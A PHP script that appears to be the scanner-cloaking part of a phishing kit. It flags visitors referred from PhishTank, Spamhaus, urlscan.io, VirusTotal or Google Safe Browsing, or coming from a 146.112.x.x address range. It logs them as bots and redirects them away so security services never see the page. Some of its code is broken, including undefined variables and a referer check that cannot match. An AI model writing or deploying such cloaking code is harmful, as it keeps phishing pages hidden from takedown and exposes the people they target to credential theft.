<?php
$bot_count = 0;

if(isset($_SERVER['HTTP_REFERER'])) {
	if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'phishtank.com') {
		$bot_count += 1;
	}
}

if(isset($_SERVER['HTTP_REFERER'])) {
	if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'www.phishtank.com') {
		$bot_count += 1;
	}
}

if(isset($_SERVER['HTTP_REFERER'])) {
    if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'www.spamhaus.org') {
        $bot_count += 1;
    }
}

if(isset($_SERVER['HTTP_REFERER'])) {
    if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'www.spamhaus.com') {
        $bot_count += 1;
    }
}
$block = array("safebrowsing.google.com","urlscan.io", "phishtank.com", "spamhaus.org", "spamhaus.com","virustotal.com","google.com");
if(isset($_SERVER['HTTP_REFERER'])){
    if (in_array ($_SERVER['HTTP_REFERER'], $block)) {
    $bot_count += 1;
    }
}
$range_start = ip2long("146.112.0.0");
$range_end   = ip2long("146.112.255.255");
$ip2long       = ip2long($_SERVER['REMOTE_ADDR']);
if ($ip2long >= $range_start && $ip2long <= $range_end){
	$bot_count += 1;
}
if($bot_count > 0){
    $date = date("h:i:s d/m/Y");
    $useragent = $useragent;
    $message = "+++++[ BOT - Referer ]+++++\n";
    $message .= "IP         : ".$ip."\n";
    $message .= "OS         : ".$os."\n";
    $message .= "Browser    : ".$browser."\n";
    $message .= "User-Agent : ".$useragent."\n";
    $message .= "+++++[ ######### ]+++++\n\n";
    $xy = fopen("./Logs/botlogs.txt", "a+");
    fwrite($xy, $message);
    fclose($xy);
    header('Location: https://href.li/?https://www.google.com/search?q='.$settings['out']);
}
?>